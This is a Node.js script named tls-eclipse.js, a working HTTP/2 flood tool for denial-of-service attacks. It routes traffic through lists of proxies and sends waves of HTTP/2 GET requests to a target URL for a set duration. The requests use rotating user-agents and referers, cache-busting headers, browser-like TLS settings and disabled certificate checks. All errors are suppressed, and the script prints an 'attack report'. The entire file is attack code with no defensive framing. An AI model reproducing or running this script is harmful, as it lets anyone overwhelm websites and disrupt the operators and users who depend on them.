const { exec } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const fs = require('fs');
const url = require('url');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const http2 = require('http2');
tls.DEFAULT_ECDH_CURVE;

let proxies, UAs, referers;
try {
  proxies = fs.readFileSync("proxy.txt", 'utf-8').replace(/\r/g, '').split('\n');
} catch {
  console.log('Proxy file not found: proxy.txt');
  process.exit();
}

try {
  UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
} catch {
  console.log('User-agent file not found: ua.txt');
  process.exit();
}

try {
  referers = fs.readFileSync('refs.txt', 'utf-8').replace(/\r/g, '').split('\n');
} catch {
  referers = ['https://google.com', 'https://bing.com'];
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000;

if (!target || !duration) {
  console.log('Usage: node tls-eclipse.js <target> <duration_in_seconds>');
  process.exit();
}

const parsed = url.parse(target);

const sigalgs = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
];
const SignalsList = sigalgs.join(':');

class TlsBuilder {
  constructor(socket) {
    this.curve = "GREASE:X25519:x25519";
    this.sigalgs = SignalsList;
    this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION |
      crypto.constants.SSL_OP_NO_TICKET |
      crypto.constants.SSL_OP_NO_SSLv2 |
      crypto.constants.SSL_OP_NO_SSLv3 |
      crypto.constants.SSL_OP_NO_COMPRESSION |
      crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
      crypto.constants.SSL_OP_TLSEXT_PADDING |
      crypto.constants.SSL_OP_ALL;
  }

  http2TUNNEL(socket) {
    socket.setKeepAlive(true, 1000);
    socket.setTimeout(10000);
    const headers = {
      ":method": "GET",
      ":path": parsed.path,
      "User-agent": UAs[Math.floor(Math.random() * UAs.length)],
      "Referer": referers[Math.floor(Math.random() * referers.length)],
      "Cache-Control": 'no-cache, no-store,private, max-age=0, must-revalidate',
      "Pragma": 'no-cache, no-store,private, max-age=0, must-revalidate',
      "client-control": 'max-age=43200, s-max-age=43200',
      "Upgrade-Insecure-Requests": "1",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "en-US,en;q=0.9"
    };

    const tunnel = http2.connect(parsed.href, {
      createConnection: () =>
        tls.connect({
          socket: socket,
          ciphers: tls.getCiphers().join(':') + ':TLS_AES_128_GCM_SHA256',
          host: parsed.host,
          servername: parsed.host,
          secure: true,
          honorCipherOrder: true,
          requestCert: true,
          secureOptions: this.Opt,
          sigalgs: this.sigalgs,
          rejectUnauthorized: false,
          ALPNProtocols: ['h2']
        })
    });

    tunnel.on('connect', () => {
      for (let i = 0; i < 16; i++) {
        setImmediate(() => {
          const req = tunnel.request(headers);
          req.on('error', () => {});
          req.close();
        });
      }
    });

    tunnel.on('error', () => {});
  }
}

const keepAliveAgent = new http.Agent({
  keepAlive: true,
  maxSockets: Infinity,
  maxTotalSockets: Infinity,
});

function Runner() {
  for (let i = 0; i < 120; i++) {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    const req = http.get({
      host: proxy[0],
      port: proxy[1],
      method: 'CONNECT',
      agent: keepAliveAgent,
      path: parsed.host + ':443',
      timeout: 8000
    });

    req.on('connect', (_, socket) => {
      const tlsBuild = new TlsBuilder();
      tlsBuild.http2TUNNEL(socket);
    });

    req.on('error', () => {});
    req.end();
  }
}

// ====== ATTACK START REPORT (like C-ECLIPSE) ======
console.clear();
console.log(`\n=== TLS-ECLIPSE ATTACK REPORT ===`);
console.log(`Target     : ${target}`);
console.log(`Duration   : ${duration / 1000}s`);
console.log(`Proxies    : ${proxies.length}`);
console.log(`User-Agents: ${UAs.length}`);
console.log(`Referers   : ${referers.length}`);
console.log(`Time       : ${new Date().toLocaleTimeString()}`);
console.log(`Attack     : Started!\n`);

const spammer = setInterval(Runner, 500);

setTimeout(() => {
  clearInterval(spammer);
  console.log('\n[+] Attack Finished, soldier out.');
  process.exit();
}, duration);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
